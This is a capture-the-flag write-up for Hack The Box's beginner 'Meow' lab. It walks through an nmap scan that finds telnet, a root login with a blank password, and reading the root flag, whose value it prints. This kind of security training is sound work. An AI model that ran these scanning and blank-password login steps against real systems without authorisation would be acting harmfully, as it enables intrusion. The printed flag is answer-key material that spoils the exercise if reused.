# Meow From Hack The Box
By Herman Detwiler

[Back](/Hack-The-Box#hack-the-box-write-ups)

## Tags
- Enumeration
- Telnet
- External
- Penetration Tester Level 1

## Settup

1. Connect to the Hack The Box Starting Point VPN
2. Spawn Meow
3. Get machine ip and set to an env variable

```bash
export ip=10.129.3.195
```
# Tasks

## 1.)  What does the acronym VM stand for? 

VM within a cyber-security context is oft refering to a **V**irtual **M**achine

## 2.)  What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It's also known as a console or shell.

This is called a `terminal`

## 3.)  What service do we use to form our VPN connection into HTB labs? 

We use `openvpn`

## 4.)  What is the abbreviated name for a 'tunnel interface' in the output of your VPN boot-up sequence output? 

Checking out or interfaces with `ifconfig` I can see that the answer is `tun`

```bash
ifconfig
```

```bash
ifconfig
...

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.15.246  netmask 255.255.254.0  destination 10.10.15.246
        inet6 fe80::dc2d:cf14:8f54:635c  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:2::11f4  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2  bytes 96 (96.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
...
```

## 5.)  What tool do we use to test our connection to the target with an ICMP echo request? 

We use `ping`

## 6.)  What is the name of the most common tool for finding open ports on a target? 

That would be `nmap`

## 7.)  What service do we identify on port 23/tcp during our scans? 

To perform a service scan of our target with nmap

```bash
sudo nmap -sC -sV $ip
```

```
Nmap scan report for 10.129.3.195
Host is up (0.075s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.32 seconds

```
From this output I can see that `telnet` is open using tcp on port 23

## 8.)  What username is able to log into the target over telnet with a blank password? 

To connect via telnet the command is 

```bash
telnet $ip
```
Trying several usernames with blank passwords, I find that `root` can login with a blank pass.

```bash
└─$ telnet $ip                                                                                                  1 ⨯
Trying 10.129.3.195...
Connected to 10.129.3.195.
Escape character is '^]'.

admin^M
  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: 
admin
Password: 

Login incorrect
Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 22 Jun 2022 04:27:18 PM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             138
  Users logged in:       0
  IPv4 address for eth0: 10.129.3.195
  IPv6 address for eth0: dead:beef::250:56ff:feb9:9143

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jun 22 16:25:47 UTC 2022 on pts/0

```
## 9.)  Submit root flag 

I can list the files within the current directory with the `ls` command. Finding an interesting file called flag.txt, I can view the content with the `cat` command:

```bash
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~# 

```
From this I find the root flag.
`b40abdfe23665f766f9c61ecba8a4c19`
